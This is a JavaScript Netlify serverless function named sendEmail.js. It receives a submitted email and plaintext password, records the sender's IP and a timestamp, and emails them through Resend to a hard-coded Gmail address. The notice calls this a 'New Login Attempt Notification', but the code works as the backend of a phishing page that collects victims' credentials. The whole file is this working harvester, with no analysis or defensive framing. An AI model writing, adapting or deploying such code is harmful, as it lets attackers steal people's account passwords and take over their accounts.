// netlify/functions/sendEmail.js

const { Resend } = require("resend");
const resend = new Resend(process.env.RESEND_API_KEY);

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }
  
  try {
    // Parse the request body (expected to be JSON)
    const data = JSON.parse(event.body);
    const { email, password } = data;
    
    // Capture additional details
    const timestamp = new Date().toISOString();
    const ip = event.headers["x-forwarded-for"] || "Not Available";
    
    // Prepare the HTML content for the email
    const emailHtml = `
      <h3>New Login Attempt Notification</h3>
      <ul>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>Password:</strong> ${password}</li>
        <li><strong>Timestamp:</strong> ${timestamp}</li>
        <li><strong>IP Address:</strong> ${ip}</li>
      </ul>
    `;
    
    // Send the email using Resend
    const emailResponse = await resend.sendEmail({
      from: "kiprotichluka70@gmail.com", // Verified sender email in Resend
      to: "mwananchihuslerloans@gmail.com", // Your notification destination email
      subject: "New Login Attempt Notification",
      html: emailHtml,
    });
    
    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Notification email sent", emailResponse }),
    };
  } catch (error) {
    console.error("Error sending email:", error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "Failed to send email", error: error.message }),
    };
  }
};
